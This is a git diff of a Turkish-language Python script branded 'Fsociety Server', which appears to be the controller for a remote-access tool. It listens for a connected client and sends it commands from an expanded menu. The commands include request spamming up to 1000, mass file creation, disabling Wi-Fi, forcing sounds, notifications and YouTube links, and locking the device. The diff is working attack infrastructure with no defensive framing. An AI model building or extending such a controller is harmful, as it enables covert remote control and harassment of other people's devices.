@@ -1,10 +1,11 @@
-
 import socket
 import argparse
+import os
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-p", "--port", type=int, default=8080, help="Dinlenecek port")
 args = parser.parse_args()
+
 ip = "0.0.0.0"
 port = args.port
 
@@ -17,28 +18,42 @@ client, addr = s.accept()
 print(f"[+] Bağlandı: {addr}")
 
 def menu():
-    print(f"""\n╔═══ Fsociety Server PORT {port} ═══╗
-║ Komutları yaz ve gönder         ║
-║ Örnek: youtube https://...      ║
-║        olustur-dosya 50         ║
-║        wifi-off                 ║
-║        sound local              ║
-║        bildirim "Başlık" "İçerik" ║
-║        bildirim-say             ║
-║        exit                     ║
-╚═════════════════════════════════╝""")
+    print(f"""
+╔════════════════════════════════════════════╗
+║          Fsociety Server Paneli           ║
+║------------------------------------------║
+║ Komutlar:                                 ║
+║ - spam-istek <sayi>   (Max 1000)          ║
+║ - olustur-dosya <sayi> (Max 100)          ║
+║ - youtube <link>                          ║
+║ - sound local                             ║
+║ - wifi-off                                ║
+║ - bildirim "Başlık" "İçerik"              ║
+║ - bildirim-say                            ║
+║ - kilit                                   ║
+║ - exit                                    ║
+╚════════════════════════════════════════════╝
+""")
 
 menu()
 
 while True:
-    komut = input("Komut >> ").strip()
-    if not komut:
-        continue
-    client.send(komut.encode())
-    if komut == "exit":
-        print("[!] Çıkış yapıldı.")
-        break
-    veri = client.recv(4096).decode()
-    print(f"[📤 Cevap]:\n{veri}")
+    try:
+        komut = input("Komut >> ").strip()
+        if not komut:
+            continue
 
-client.close()
+        client.send(komut.encode())
+
+        if komut == "exit":
+            print("[✓] Bağlantı sonlandırıldı.")
+            break
+
+        cevap = client.recv(4096).decode()
+        print(f"[📥] Cevap:\n{cevap}")
+
+    except KeyboardInterrupt:
+        print("\n[!] Sunucu durduruldu.")
+        client.send(b"exit")
+        client.close()
+        break
